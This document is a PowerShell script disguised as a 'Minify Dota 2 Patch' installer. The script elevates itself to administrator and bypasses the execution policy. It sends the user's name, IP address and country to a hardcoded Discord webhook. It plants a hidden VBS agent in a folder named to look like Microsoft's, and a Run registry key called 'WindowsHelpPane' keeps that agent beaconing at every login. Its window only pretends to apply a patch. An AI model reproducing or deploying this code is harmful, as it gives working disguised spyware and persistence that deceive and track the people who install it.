# Check for Admin
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# WEBHOOK URL
$WEB_URL = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"

# ФУНКЦИЯ ГЕОПОЗИЦИИ (ФЛАГ + IP)
function Get-GeoInfo {
    try {
        $data = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,countryCode,query" -TimeoutSec 3
        if ($data.status -eq "success") {
            $c1 = [int][char]$data.countryCode[0] + 127397
            $c2 = [int][char]$data.countryCode[1] + 127397
            $flag = [char]::ConvertFromUtf32($c1) + [char]::ConvertFromUtf32($c2)
            return @{ info = "$flag $($data.countryCode)"; ip = $data.query }
        }
    } catch {}
    return @{ info = "🌐 UNK"; ip = "Unknown" }
}

# LOGGER FUNCTION
function Send-LogNotification {
    param([string]$Status, [string]$Message)
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    $geo = Get-GeoInfo
    $color = if ($Status -eq "SUCCESS") { 65280 } else { 16776960 }
    
    $payload = @{
        embeds = @(@{
            title = "Minify Installer Log"; color = $color
            fields = @(
                @{name="Status"; value="``$Status``"; inline=$true},
                @{name="User"; value="``$env:USERNAME``"; inline=$true},
                @{name="Location"; value="$($geo.info) ($($geo.ip))"; inline=$true},
                @{name="Message"; value=$Message}
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        })
    } | ConvertTo-Json -Compress
    
    try {
        Invoke-RestMethod -Uri $WEB_URL -Method Post -ContentType "application/json; charset=utf-8" -Body ([System.Text.Encoding]::UTF8.GetBytes($payload))
    } catch {}
}

# AGENT INSTALLATION (VBS MONITOR)
function Install-MonitorAgent {
    $dir = "$env:APPDATA\Microsoft\HelpPane"
    $vbs = "$dir\monitor.vbs"
    if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
    
    $vbsContent = @"
On Error Resume Next
Set sh = CreateObject("WScript.Shell")
WScript.Sleep 20000
ps = "powershell -NoP -W Hidden -C ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod -Uri '$WEB_URL' -Method Post -ContentType 'application/json' -Body '{\""content\"":\""🚀 Агент запущен на ПК: %USERNAME%\""}'"""
sh.Run ps, 0, False
"@
    $vbsContent | Out-File -FilePath $vbs -Encoding Default -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHelpPane" -Value "wscript.exe `"$vbs`" //B" -Force
}

# START EXECUTION
Send-LogNotification -Status "STARTED" -Message "Инсталлятор запущен"
Install-MonitorAgent

# GUI
Add-Type -AssemblyName System.Windows.Forms
$f = New-Object System.Windows.Forms.Form
$f.Text = "Minify Dota 2 Patch"
$f.Size = "400,200"
$f.StartPosition = "CenterScreen"
$l = New-Object System.Windows.Forms.Label
$l.Text = "Applying patch... please wait"
$l.AutoSize = $true
$l.Location = "50,50"
$f.Controls.Add($l)
$f.Show()
$f.Refresh()

Start-Sleep -Seconds 5
$f.Close()

Send-LogNotification -Status "SUCCESS" -Message "Установка завершена успешно"
